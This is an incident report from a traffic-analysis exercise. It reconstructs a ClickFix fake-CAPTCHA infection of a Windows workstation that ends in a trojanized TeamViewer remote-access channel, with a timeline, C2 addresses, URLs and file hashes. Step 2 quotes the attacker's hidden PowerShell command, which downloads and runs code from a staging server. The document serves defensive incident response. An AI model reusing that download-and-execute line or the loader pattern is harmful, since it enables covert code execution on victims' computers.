# Incident Report: 2025-01-22 Traffic Analysis Exercise

## Victim Host

| Field | Value |
|---|---|
| IPv4 | 10.1.17.215 |
| MAC | 00:d0:b7:26:4a:74 |
| Windows hostname | DESKTOP-L8C5GSJ (domain: bluemoontuesday.com) |
| Logged-in user | shutchenson (confirmed via Kerberos AS-REQ CNameString from 10.1.17.215) |

## Malware Family

**ClickFix-delivered remote-access trojan riding on a trojanized TeamViewer install** ("TVRAT" / TeamViewer-abuse RAT pattern). Attribution is **behavioral**, based on the full delivery chain, obfuscated PowerShell loader, dropped TeamViewer binaries used as a covert C2/remote-control channel, and beacon telemetry to attacker infrastructure. No file matched a known-hash signature during this offline review (no internet lookups performed per instructions), so the family label reflects TTP pattern-matching rather than a hash/signature hit.

## Attack Chain (timeline, relative seconds into capture)

1. **t=39.5s** — TLS connection with SNI `authenticatoor.org` (82.221.136.26) — consistent with a fake-CAPTCHA/"verify you are human" ClickFix lure page.
2. **t=60.3s** — HTTP GET to `http://5.252.153.241/api/file/get-file/264872` — downloads a Windows Script Component (`.sct`) containing obfuscated VBScript.
   - The `.sct` payload runs: `cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command "start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1')"` — a decoy legitimate site is opened while PowerShell fetches the next stage in the background, a classic ClickFix/fake-CAPTCHA social-engineering signature.
3. **t=62.1s** — HTTP GET `/api/file/get-file/29842.ps1` — obfuscated Base64/IEX PowerShell loader (`iex ([system.text.encoding]::UTF8.GetString([system.convert]::FromBase64String(...)))`).
4. **t=125–129s** — Loader pulls down a full TeamViewer installation package from 5.252.153.241:
   - `/api/file/get-file/TeamViewer` (4,380,968 bytes, PE32 GUI EXE)
   - `/api/file/get-file/TV` (12,920 bytes, PE32 DLL)
   - `/api/file/get-file/Teamviewer_Resource_fr` (668,968 bytes, PE32 GUI DLL)
   - `/api/file/get-file/pas.ps1` (second obfuscated PS1, same IEX/Base64 pattern) at t=129.0s
5. **Post-install** — Host beacons `GET /1517096937` to 5.252.153.241 every ~5 seconds (heartbeat/check-in), with status messages logged in the URL query string:
   - `?k=message = startup shortcut created; status = success;` — persistence via a startup-folder shortcut
   - `?k=script: RunRH, status: OK, message: PS process started` — confirms a PowerShell-based launcher/handler is running on the host
6. **t=889.5s onward** — Host establishes a sustained TCP session to **45.125.66.32:2917**, wrapped in TLS using a **self-signed certificate** issued for the bare IP address (no domain, "45.125.66.32: Self-signed certificate") — this is the RAT's command-and-control channel, disguised as TeamViewer's TLS relay traffic. A secondary session to 45.125.66.252:443 runs in parallel over the same period (2283s duration), consistent with TeamViewer's normal relay/DynGate infrastructure but co-located with the malicious activity.

## Indicators of Compromise

### C2 Endpoints
| Indicator | Evidence |
|---|---|
| 5.252.153.241:80 | HTTP payload staging server: served the `.sct` dropper, both PS1 loaders, all three TeamViewer PE files, and receives the `/1517096937` heartbeat beacon every ~5s |
| 45.125.66.32:2917 | Sustained TLS session using a self-signed cert bound to the bare IP (no SNI/hostname) starting at t=889.5s; non-standard port; behaves as the RAT's live C2/handler channel |
| 82.221.136.26:443 | TLS SNI `authenticatoor.org` — initial ClickFix lure/landing page contact at t=39.5s |

### Domains
| Domain | Evidence |
|---|---|
| authenticatoor.org | Resolved to 82.221.136.26; TLS SNI observed at start of incident (t=39.5s), preceding the first malicious download by ~21s |
| appointedtimeagriculture.com | Resolved to 217.70.186.109 via DNS from the victim; no HTTP/TLS payload captured but queried during the incident window, name is typosquat-style social-engineering pattern |

Note: `google-authenticator.burleson-appliance.net` resolved to Cloudflare anycast IPs (104.21.x.x) and showed a TLS SNI hit but no distinguishing payload traffic was captured to it; listed here only as a queried hostname of interest, not confirmed malicious in this capture (weak evidence, included for completeness).

### URLs
- `http://5.252.153.241/api/file/get-file/264872` — dropper (.sct/VBScript)
- `http://5.252.153.241/api/file/get-file/29842.ps1` — stage-2 obfuscated PowerShell loader
- `http://5.252.153.241/api/file/get-file/pas.ps1` — stage-3 obfuscated PowerShell loader
- `http://5.252.153.241/api/file/get-file/TeamViewer` — trojanized TeamViewer main executable
- `http://5.252.153.241/api/file/get-file/TV` — companion DLL
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr` — companion resource DLL
- `http://5.252.153.241/1517096937` (repeated, ~5s interval) — beacon/heartbeat check-in

### Files and Hashes (SHA256, computed from objects carved directly out of the pcap)
| File name | Type | SHA256 |
|---|---|---|
| 264872 | HTML/VBScript component (.sct dropper) | c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103 |
| 29842.ps1 | PowerShell loader (obfuscated) | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded |
| pas.ps1 | PowerShell loader (obfuscated) | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e |
| TeamViewer | PE32 GUI executable | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e |
| TV | PE32 DLL | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 |
| Teamviewer_Resource_fr | PE32 GUI DLL | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 |

## Benign Context (excluded from IOCs)
Windows Update/Delivery Optimization (windowsupdate.com, ctldl.windowsupdate.com), Microsoft telemetry/CDN (events.data.microsoft.com, azureedge.net, msftconnecttest.com), Bing/MSN/Office/login.microsoftonline.com traffic, NTP pools, Google/Facebook/LinkedIn ad/analytics beacons, NVIDIA GFE, and legitimate TeamViewer master/DynGate servers (`master16.teamviewer.com`, 185.188.32.26) contacted for normal relay negotiation are all standard host/network noise and are not part of the compromise.

## Incident Summary
The Windows workstation DESKTOP-L8C5GSJ (10.1.17.215, MAC 00:d0:b7:26:4a:74), logged in as domain user shutchenson, was compromised via a ClickFix-style fake-verification lure at `authenticatoor.org` that tricked the user into running a PowerShell one-liner. This pulled a VBScript dropper and two obfuscated PowerShell loaders from 5.252.153.241, which in turn installed a trojanized TeamViewer package (TeamViewer.exe, TV, Teamviewer_Resource_fr) and created a startup-folder persistence shortcut. The host then beaconed every 5 seconds to the staging server and opened a sustained self-signed-TLS session to 45.125.66.32:2917, giving the attacker a remote-access channel disguised as TeamViewer traffic.
